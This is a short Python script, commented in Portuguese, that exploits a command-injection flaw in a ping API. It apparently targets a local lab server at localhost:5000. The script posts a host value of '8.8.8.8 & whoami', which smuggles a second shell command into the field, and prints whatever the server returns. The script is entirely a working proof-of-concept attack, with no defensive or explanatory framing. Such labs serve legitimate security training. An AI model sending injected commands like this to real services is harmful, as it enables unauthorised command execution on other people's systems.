import requests
URL_ALVO = "http://localhost:5000/api/v1/ping"
print("=" * 50)
print("EXPLORANDO FALHA DE COMMAND INJECTION")
print("=" * 50)
payload = {
    "host": "8.8.8.8"
}
payload = {"host": "8.8.8.8 & whoami"}
try:
    print(f"[*]Enviando payload para: {URL_ALVO}")
    resposta = requests.post(URL_ALVO, json=payload)
    print(f"[+] Status da Resposta: {resposta.status_code}")
    print("[+] Resposta do Servidor: \n")
    print("-" * 50)
    print(resposta.text)
    print("-" * 50)
except Exception as e:
    print(f"[-] Erro ao conectar no servidor: {e}")